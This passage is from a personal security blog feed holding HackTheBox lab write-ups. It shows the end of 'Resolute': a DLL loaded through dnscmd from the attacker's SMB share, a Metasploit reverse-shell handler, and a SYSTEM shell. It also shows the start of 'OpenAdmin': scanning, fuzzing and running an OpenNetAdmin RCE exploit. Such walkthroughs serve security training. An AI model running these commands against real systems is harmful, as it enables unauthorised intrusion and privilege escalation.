class="number">1.0</span></span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] <span class="function">Incoming <span class="title">connection</span> <span class="params">(<span class="number">10.10</span><span class="number">.10</span><span class="number">.169</span>,<span class="number">59611</span>)</span></span></span><br><span class="line">[*] AUTHENTICATE_MESSAGE (\,RESOLUTE)</span><br><span class="line">[*] User RESOLUTE\ authenticated successfully</span><br><span class="line">[*] :::<span class="number">00</span>::<span class="number">4141414141414141</span></span><br><span class="line">[*] <span class="function">Disconnecting <span class="title">Share</span><span class="params">(<span class="number">1</span>:SHARE)</span></span></span><br><span class="line">[*] Handle: 'ConnectionResetError' object is not subscriptable</span><br><span class="line">[*] <span class="function">Closing down <span class="title">connection</span> <span class="params">(<span class="number">10.10</span><span class="number">.10</span><span class="number">.169</span>,<span class="number">59611</span>)</span></span></span><br><span class="line">[*] Remaining connections []</span><br><span class="line">[*] <span class="function">Incoming <span class="title">connection</span> <span class="params">(<span class="number">10.10</span><span class="number">.10</span><span class="number">.169</span>,<span class="number">59760</span>)</span></span></span><br><span class="line">[*] AUTHENTICATE_MESSAGE (MEGABANK\RESOLUTE$,RESOLUTE)</span><br><span class="line">[*] User RESOLUTE\RESOLUTE$ authenticated successfully</span><br><span class="line">[*] RESOLUTE$::MEGABANK:<span class="number">4141414141414141</span>:<span class="number">6b</span>f4545d80d2f13607b0c9d3f91bd604:<span class="number">010100000000000080</span>adb2044837d601ec836f15824f4098000000000100100078005700710051006a0067004a004f000300100078005700710051006a0067004a004f00020010006b00540075006600480053004f006c00040010006b00540075006600480053004f006c000700080080adb2044837d60106000400020000000800300030000000000000000000000000400000318efa794fd558b74c119e534800bb85deca03c294098a118af41f41a36559c40a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100380037000000000000000000</span><br><span class="line">[*] <span class="function">Disconnecting <span class="title">Share</span><span class="params">(<span class="number">1</span>:SHARE)</span></span></span><br><span class="line">[*] Handle: 'ConnectionResetError' object is not subscriptable</span><br><span class="line">[*] <span class="function">Closing down <span class="title">connection</span> <span class="params">(<span class="number">10.10</span><span class="number">.10</span><span class="number">.169</span>,<span class="number">59760</span>)</span></span></span><br><span class="line">[*] Remaining connections []</span><br></pre></td></tr></table></figure><p>Now let‚Äôs run <code>metasploit</code> with <code>meterpreter</code> sessions and start listening .</p><h3 id="Setup-Meterpreter-session"><a href="#Setup-Meterpreter-session" class="headerlink" title="Setup Meterpreter session"></a>Setup Meterpreter session</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Resolute </span><br><span class="line">‚ùØ msfconsole</span><br><span class="line">[!] The following modules could not be loaded!../</span><br><span class="line">[!]     /root/.msf4/modules/exploits/cgi/webapps/wordpress_userpro.rb</span><br><span class="line">[!] Please see /root/.msf4/logs/framework.log <span class="keyword">for</span> details.</span><br><span class="line">                                                  </span><br><span class="line">               .;lxO0KXXXK0Oxl:.</span><br><span class="line">           ,o0WMMMMMMMMMMMMMMMMMMKd,</span><br><span class="line">        <span class="string">'xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,</span></span><br><span class="line"><span class="string">      :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:</span></span><br><span class="line"><span class="string">    .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,</span></span><br><span class="line"><span class="string">   lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo</span></span><br><span class="line"><span class="string">  xMMMMMMMMMMWd.               .oNMMMMMMMMMMk</span></span><br><span class="line"><span class="string"> oMMMMMMMMMMx.                    dMMMMMMMMMMx</span></span><br><span class="line"><span class="string">.WMMMMMMMMM:                       :MMMMMMMMMM,</span></span><br><span class="line"><span class="string">xMMMMMMMMMo                         lMMMMMMMMMO</span></span><br><span class="line"><span class="string">NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;</span></span><br><span class="line"><span class="string">MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:</span></span><br><span class="line"><span class="string">NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:</span></span><br><span class="line"><span class="string">xMMMMMMMMMd                        ,0MMMMMMMMMMK;</span></span><br><span class="line"><span class="string">.WMMMMMMMMMc                         '</span>OMMMMMM0,</span><br><span class="line"> lMMMMMMMMMMk.                         .kMMO<span class="string">'</span></span><br><span class="line"><span class="string">  dMMMMMMMMMMWd'</span>                         ..</span><br><span class="line">   cWMMMMMMMMMMMNxc<span class="string">'.                ##########</span></span><br><span class="line"><span class="string">    .0MMMMMMMMMMMMMMMMWc            #+#    #+#</span></span><br><span class="line"><span class="string">      ;0MMMMMMMMMMMMMMMo.          +:+</span></span><br><span class="line"><span class="string">        .dNMMMMMMMMMMMMo          +#++:++#+</span></span><br><span class="line"><span class="string">           '</span>oOWMMMMMMMMo                +:+</span><br><span class="line">               .,cdkO0K;        :+:    :+:                                </span><br><span class="line">                                :::::::+:</span><br><span class="line">                      Metasploit</span><br><span class="line"></span><br><span class="line">       =[ metasploit v5.0.87-dev                          ]</span><br><span class="line">+ -- --=[ 2006 exploits - 1096 auxiliary - 343 post       ]</span><br><span class="line">+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 7 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit tip: When <span class="keyword">in</span> a module, use back to go back to the top level prompt</span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit/multi/handler                                                                                                                                                          </span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> LHOST 10.10.14.187</span><br><span class="line">LHOST =&gt; 10.10.14.187                                                                                                                                                                     </span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> LPORT 9001</span><br><span class="line">LPORT =&gt; 9001                                                                                                                                                                             </span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line">PAYLOAD =&gt; windows/x64/meterpreter/reverse_tcp                                                                                                                                            </span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.187:9001</span><br></pre></td></tr></table></figure><p>all things now are setup. so now I will do the exploitation‚Äô i will load again my <code>dll</code> file.</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; dnscmd /config /serverlevelplugindll \\<span class="number">10.10</span><span class="number">.14</span><span class="number">.187</span>\SHARE\main.dll</span><br><span class="line"></span><br><span class="line">Registry property serverlevelplugindll successfully reset.</span><br><span class="line">Command completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt;</span><br></pre></td></tr></table></figure><p>so based on the <code>article</code> I will stop and start the <code>dns</code> services, this will invoke my <code>dll</code> file and captured <code>meterpreter</code> shell.</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; sc.exe stop dns</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: dns</span><br><span class="line">        TYPE               : <span class="number">10</span>  WIN32_OWN_PROCESS</span><br><span class="line">        STATE              : <span class="number">3</span>  STOP_PENDING</span><br><span class="line">                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : <span class="number">0</span>  (<span class="number">0x0</span>)</span><br><span class="line">        SERVICE_EXIT_CODE  : <span class="number">0</span>  (<span class="number">0x0</span>)</span><br><span class="line">        CHECKPOINT         : <span class="number">0x0</span></span><br><span class="line">        WAIT_HINT          : <span class="number">0x0</span></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt;</span><br></pre></td></tr></table></figure><p>then start <code>dns</code> service</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; sc.exe start dns</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: dns</span><br><span class="line">        TYPE               : <span class="number">10</span>  WIN32_OWN_PROCESS</span><br><span class="line">        STATE              : <span class="number">2</span>  START_PENDING</span><br><span class="line">                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : <span class="number">0</span>  (<span class="number">0x0</span>)</span><br><span class="line">        SERVICE_EXIT_CODE  : <span class="number">0</span>  (<span class="number">0x0</span>)</span><br><span class="line">        CHECKPOINT         : <span class="number">0x0</span></span><br><span class="line">        WAIT_HINT          : <span class="number">0x7d0</span></span><br><span class="line">        PID                : <span class="number">1144</span></span><br><span class="line">        FLAGS              :</span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt;</span><br></pre></td></tr></table></figure><p>and finally got a Administrator shell !</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.187:9001 </span><br><span class="line">[*] Sending stage (201283 bytes) to 10.10.10.169</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.14.187:9001 -&gt; 10.10.10.169:59761) at 2020-05-31 20:35:54 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><h3 id="System-Information"><a href="#System-Information" class="headerlink" title="System Information"></a>System Information</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : RESOLUTE</span><br><span class="line">OS              : Windows 2016+ (10.0 Build 14393).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : en_US</span><br><span class="line">Domain          : MEGABANK</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x64/windows</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><h3 id="Get-the-root-txt"><a href="#Get-the-root-txt" class="headerlink" title="Get the root.txt"></a>Get the root.txt</h3><p>So let‚Äôs pop up a shell and get the <code>root.txt</code> :</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process <span class="number">1596</span> created.</span><br><span class="line">Channel <span class="number">1</span> created.</span><br><span class="line">Microsoft Windows [Version <span class="number">10.0</span><span class="number">.14393</span>]</span><br><span class="line">(c) <span class="number">2016</span> Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">C:\Users&gt;cd Administrator/Desktop</span><br><span class="line">cd Administrator/Desktop</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number <span class="keyword">is</span> <span class="number">923F</span><span class="number">-3611</span></span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line"><span class="number">12</span>/<span class="number">04</span>/<span class="number">2019</span>  <span class="number">06</span>:<span class="number">18</span> AM    &lt;DIR&gt;          .</span><br><span class="line"><span class="number">12</span>/<span class="number">04</span>/<span class="number">2019</span>  <span class="number">06</span>:<span class="number">18</span> AM    &lt;DIR&gt;          ..</span><br><span class="line"><span class="number">12</span>/<span class="number">03</span>/<span class="number">2019</span>  <span class="number">08</span>:<span class="number">32</span> AM                <span class="number">32</span> root.txt</span><br><span class="line">               <span class="number">1</span> File(s)             <span class="number">32</span> bytes</span><br><span class="line">               <span class="number">2</span> Dir(s)  <span class="number">30</span>,<span class="number">837</span>,<span class="number">903</span>,<span class="number">360</span> bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;Get-Content <span class="string">"root.txt"</span> | Measure-Object -Character -Word    </span><br><span class="line">Get-Content <span class="string">"root.txt"</span> | Measure-Object -Character -Word</span><br><span class="line"><span class="string">'Get-Content'</span> <span class="keyword">is</span> not recognized <span class="keyword">as</span> an <span class="keyword">internal</span> or external command,</span><br><span class="line">operable program or batch file.</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;powershell</span><br><span class="line">powershell</span><br><span class="line">Windows PowerShell </span><br><span class="line">Copyright (C) <span class="number">2016</span> Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">PS C:\Users\Administrator\Desktop&gt; Get-Content <span class="string">"root.txt"</span> | Measure-Object -Character -Word</span><br><span class="line">Get-Content <span class="string">"root.txt"</span> | Measure-Object -Character -Word</span><br><span class="line"></span><br><span class="line">Lines Words Characters Property</span><br><span class="line">----- ----- ---------- --------</span><br><span class="line">          <span class="number">1</span>         <span class="number">32</span>         </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\Users\Administrator\Desktop&gt;</span><br></pre></td></tr></table></figure><hr><p>If you liked my writeup please leave a respect on my <a href="https://www.hackthebox.eu/profile/128965" target="_blank" rel="noopener">Profile</a></p><p><img src="https://www.hackthebox.eu/badge/image/128965" alt="Payas0" title="Payas0"></p><hr><p>Referrences:</p><p><a href="http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html" target="_blank" rel="noopener">Abusing DNSAdmins privilege for escalation in Active Directory</a></p><p><a href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise" target="_blank" rel="noopener">From DnsAdmins to SYSTEM to Domain Compromise</a></p><p><a href="https://blog.ropnop.com/transferring-files-from-kali-to-windows/#smb" target="_blank" rel="noopener">Transferring Files from Linux to Windows (post-exploitation)</a></p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
          <category> PenTesting </category>
          
      </categories>
      
      
        <tags>
            
            <tag> retired </tag>
            
            <tag> windows </tag>
            
            <tag> smb </tag>
            
            <tag> dns </tag>
            
            <tag> dll </tag>
            
            <tag> metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - OpenAdmin</title>
      <link href="/2020-05-03/HackTheBox-OpenAdmin/"/>
      <url>/2020-05-03/HackTheBox-OpenAdmin/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/openA/open-admin.png" alt="HackTheBox-OpenAdmin" title="Open Admin"></p><hr><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>   ‚Üí another easy box machine that you can easily find the exploit and get the shell with <strong>RCE</strong> or <strong>Remote Code Execution</strong> if you know how to do with the exploit. The second phase is to find user in <code>mysql database</code> base on the <code>database</code> configuration then login user as <em><code>Jimmy</code></em>. <code>user.txt</code> still cannot get on this phase so I need to the first privilege escalation to get the user <em><code>Joanna</code></em> by enumerating the website that is running on the machine. Then the <code>root</code> part is very simple. The user has a privilege root to run <em><code>nano</code></em> which can execute directly a shell.</p><hr><h2 id="Penetration-Testing-Methodologies"><a href="#Penetration-Testing-Methodologies" class="headerlink" title="Penetration Testing Methodologies"></a>Penetration Testing Methodologies</h2><ol><li><p><strong>Network Scanning</strong></p><p>‚Üí Nmap scan</p><p>‚Üí discover open ports and what services are running</p></li><li><p><strong>Enumeration</strong></p><p>‚Üí Browsing the HTTP Service</p><p>‚Üí Fuzzing the webpage we get the page <code>music</code></p><p>‚Üí Clicking on the login we get the page <code>/ona</code></p></li><li><p><strong>Post - Exploitation</strong></p><p>‚Üí Identifies vulnerabilites</p><p>‚Üí By clicking the <code>DOWNLOAD</code> button it‚Äôs redirect on <code>OpenNetAdmin</code> with version <code>v18.1.1</code></p><p>‚Üí directly to google and search <code>opennetadmin v18.1.1 exploit</code> and it is <strong>RCE</strong> or <strong>Remote Code Execution</strong></p><p>‚Üí run the bash script to get <strong><code>RCE</code></strong></p><p>‚Üí enumerate the shell</p></li><li><p><strong>Exploitation</strong></p><p>‚Üí send <code>php</code> backdoor to get <code>reverse shell</code></p><p>‚Üí then run <strong><code>LinEnum</code></strong> to saved time in enumeration</p><p>‚Üí found interesting configuration files at <code>/opt/ona/www/</code> directories which the website is installed.</p><p>‚Üí found a <code>password</code> user for <code>jimmy</code></p></li><li><p><strong>Privilege Escalation</strong></p><p>‚Üí <em>Phase 1</em></p><ul><li>get the user <code>joanna</code></li><li>we found internal websites which has a running at port <code>52846</code></li><li>running <code>curl</code> with the internal websites I get the <code>rsa key</code> of user <code>joanna</code></li><li>decrypt <code>rsa key</code> with <code>ssh2john</code></li><li>cracked the <code>rsa hash</code> with <code>john</code> to get the password</li><li>finally login as user <code>joanna</code> then get the <code>user.txt</code></li></ul><p>‚Üí <em>Phase 2</em></p><ul><li>running <code>sudo -l</code> the user has given privileges by root to run nano.</li><li>by referrences from <code>GTFObins</code> I directly execute a shell which is a <code>root</code></li><li>then get the <code>root.txt</code></li></ul></li></ol><hr><h2 id="Network-Scanning"><a href="#Network-Scanning" class="headerlink" title="Network Scanning"></a>Network Scanning</h2><h3 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h3><p>‚Üí I always begin at <strong><em>NMAP</em></strong> to look on the services what is running. I always use</p><hr><ul><li>-sV      ‚áí Probe open ports to determine service/version info</li><li>-sC      ‚áí equivalent to ‚Äîscript=default</li><li>-A-      ‚áí Agressive scan</li><li>-oN      ‚áí to save our scan results to a text file</li></ul><hr><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">nmap -sV -sC -A -T4 10.10.10.171 -oN nmap-OpenAdmin</span><br></pre></td></tr></table></figure><hr><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/OpenAdmin </span><br><span class="line">‚ùØ nmap -sV -sC -A 10.10.10.171 -oN nmap-OpenAdmin</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-04 02:22 PST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.171</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:<span class="built_in">cd</span>:bc:92:00:b7:54 (RSA)</span><br><span class="line">|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)</span><br><span class="line">|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.16 (93%), Linux 3.13 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Android 4.1.1 (93%), Linux 3.8 (92%), Android 4.1.2 (92%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 199/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   202.97 ms 10.10.14.1</span><br><span class="line">2   204.23 ms 10.10.10.171</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 128.52 seconds</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/OpenAdmin took 2m8s </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><hr><h3 id="Nmap-results"><a href="#Nmap-results" class="headerlink" title="Nmap results"></a>Nmap results</h3><p>So there‚Äôs only 2 port open.</p><ul><li>22       ‚áí which basically a <code>SSH</code></li><li>80       ‚áí which running <code>HTTP Service</code> or a <code>website</code></li></ul><hr><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="OpenAdmin-website"><a href="#OpenAdmin-website" class="headerlink" title="OpenAdmin website"></a>OpenAdmin website</h3><p>as always i first enumerate a machine if it is running a website. Visiting the page I get a default page of <code>Apache</code></p><p><img src="/img/openA/openA-apache-web.png" alt="HackTheBox-OpenAdmin" title="Open Admin Home page"></p><h3 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h3><p>I tried to run my favorite bruteforce directory tool <code>dirsearch</code> but it takes so much time. So I tried to fuzz the website as my second option with<code>directory-list-2.3-medium.txt</code> wordlists so :</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/OpenAdmin </span><br><span class="line">‚ùØ wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404,403,400 http://10.10.10.171/FUZZ</span><br><span class="line"></span><br><span class="line">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="string">'s documentation for more information.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">* Wfuzz 2.4.5 - The Web Fuzzer                         *</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Target: http://10.10.10.171/FUZZ</span></span><br><span class="line"><span class="string">Total requests: 220560</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">===================================================================</span></span><br><span class="line"><span class="string">ID           Response   Lines    Word     Chars       Payload                                                                                                                   </span></span><br><span class="line"><span class="string">===================================================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">000000001:   200        375 L    964 W    10918 Ch    "# directory-list-2.3-medium.txt"                                                                                         </span></span><br><span class="line"><span class="string">000000002:   200        375 L    964 W    10918 Ch    "#"                                                                                                                       </span></span><br><span class="line"><span class="string">000000004:   200        375 L    964 W    10918 Ch    "#"                                                                                                                       </span></span><br><span class="line"><span class="string">000000006:   200        375 L    964 W    10918 Ch    "# Attribution-Share Alike 3.0 License. To view a copy of this"                                                           </span></span><br><span class="line"><span class="string">000000007:   200        375 L    964 W    10918 Ch    "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                                         </span></span><br><span class="line"><span class="string">000000009:   200        375 L    964 W    10918 Ch    "# Suite 300, San Francisco, California, 94105, USA."                                                                     </span></span><br><span class="line"><span class="string">000000003:   200        375 L    964 W    10918 Ch    "# Copyright 2007 James Fisher"                                                                                           </span></span><br><span class="line"><span class="string">000000010:   200        375 L    964 W    10918 Ch    "#"                                                                                                                       </span></span><br><span class="line"><span class="string">000000005:   200        375 L    964 W    10918 Ch    "# This work is licensed under the Creative Commons"                                                                      </span></span><br><span class="line"><span class="string">000000008:   200        375 L    964 W    10918 Ch    "# or send a letter to Creative Commons, 171 Second Street,"                                                              </span></span><br><span class="line"><span class="string">000000011:   200        375 L    964 W    10918 Ch    "# Priority ordered case sensative list, where entries were found"                                                        </span></span><br><span class="line"><span class="string">000000012:   200        375 L    964 W    10918 Ch    "# on atleast 2 different hosts"                                                                                          </span></span><br><span class="line"><span class="string">000000013:   200        375 L    964 W    10918 Ch    "#"                                                                                                                       </span></span><br><span class="line"><span class="string">000000014:   200        375 L    964 W    10918 Ch    ""                                                                                                                        </span></span><br><span class="line"><span class="string">000000172:   301        9 L      28 W     312 Ch      "music"                                                                                                                   </span></span><br><span class="line"><span class="string">000005045:   301        9 L      28 W     314 Ch      "artwork"                                                                                                                 </span></span><br><span class="line"><span class="string">000044892:   301        9 L      28 W     313 Ch      "sierra"                                                                                                                  </span></span><br><span class="line"><span class="string">000045240:   200        375 L    964 W    10918 Ch    ""                                                                                                                        </span></span><br><span class="line"><span class="string">000146283:   404        9 L      31 W     274 Ch      "103425"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root in htb/boxes/OpenAdmin took 8m47s </span></span><br><span class="line"><span class="string">‚ùØ</span></span><br></pre></td></tr></table></figure><p>I get the directory page <code>music</code> but it seems there‚Äôs no interesting stuffs here :</p><p><img src="/img/openA/openA-music-page.png" alt="HackTheBox-OpenAdmin" title="Open Admin Home page"></p><hr><h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post Exploitation"></a>Post Exploitation</h2><h3 id="Identify-vulnerabilities"><a href="#Identify-vulnerabilities" class="headerlink" title="Identify vulnerabilities"></a>Identify vulnerabilities</h3><p>if you clicked on <code>Login</code> button it‚Äôs redirect to page <code>/ona</code> which did not appearch on my fuzz.</p><p><img src="/img/openA/openA-ona.png" alt="HackTheBox-OpenAdmin" title="Open Admin ona"></p><p>As you can see it‚Äôs look like a web configuration probably for networks and dns. also the page gave me a hint because if you look the site it is running on a outdate version <code>v18.1.1</code>, I clicked on the download page it is redirect me to <code>OpenNetAdmin</code> site.</p><p><img src="/img/openA/openA-OpenNetAdmin.png" alt="HackTheBox-OpenAdmin" title="Open Net Admin"></p><p>So I finally know what to do, directly search to google <code>opennetadmin v18.1.1 exploit</code> and there was on <code>ExploitDB</code> written in bash.</p><h3 id="RCE-or-Remote-Code-Execution"><a href="#RCE-or-Remote-Code-Execution" class="headerlink" title="RCE or Remote Code Execution"></a>RCE or Remote Code Execution</h3><p>I run exploit to get the shell of <code>www-data</code> but i have not proper shell :</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/OpenAdmin </span><br><span class="line">‚ùØ bash exploit.sh http://10.10.10.171/ona/</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/opt/ona/www</span><br><span class="line">$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure><p>when I tried to enumate the site‚Äô the only thing i found interesting is the <code>config</code> directory :</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">$ ls -l /opt/ona/www</span><br><span class="line">total 68</span><br><span class="line">drwxrwxr-x 2 www-data www-data 4096 Jan  3  2018 config</span><br><span class="line">-rw-rw-r-- 1 www-data www-data 1949 Jan  3  2018 config_dnld.php</span><br><span class="line">-rw-rw-r-- 1 www-data www-data 4160 Jan  3  2018 dcm.php</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 May  3 19:42 i</span><br><span class="line">-rw-r--r-- 1 www-data www-data  216 May  3 17:33 i.py</span><br><span class="line">drwxrwxr-x 3 www-data www-data 4096 Jan  3  2018 images</span><br><span class="line">drwxrwxr-x 9 www-data www-data 4096 Jan  3  2018 include</span><br><span class="line">-rw-rw-r-- 1 www-data www-data 1999 Jan  3  2018 index.php</span><br><span class="line">drwxrwxr-x 5 www-data www-data 4096 Jan  3  2018 <span class="built_in">local</span></span><br><span class="line">-rw-rw-r-- 1 www-data www-data 4526 Jan  3  2018 login.php</span><br><span class="line">-rw-rw-r-- 1 www-data www-data 1106 Jan  3  2018 logout.php</span><br><span class="line">drwxrwxr-x 3 www-data www-data 4096 Jan  3  2018 modules</span><br><span class="line">drwxrwxr-x 3 www-data www-data 4096 Jan  3  2018 plugins</span><br><span class="line">drwxrwxr-x 2 www-data www-data 4096 Jan  3  2018 winc</span><br><span class="line">drwxrwxr-x 3 www-data www-data 4096 Jan  3  2018 workspace_plugins</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>trying to list what‚Äôs on the <code>config</code> directory</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">$ ls -l /opt/ona/www/config</span><br><span class="line">total 16</span><br><span class="line">-rw-rw-r-- 1 www-data www-data 1905 Jan  3  2018 auth_ldap.config.php</span><br><span class="line">-rw-rw-r-- 1 www-data www-data 9983 Jan  3  2018 config.inc.php</span><br><span class="line">$</span><br></pre></td></tr></table></figure><h3 id="Enumerate-web-configuration"><a href="#Enumerate-web-configuration" class="headerlink" title="Enumerate web configuration"></a>Enumerate web configuration</h3><p>I trying first at the <code>config.inc.php</code> and I found a configuration of <code>database</code> file.</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 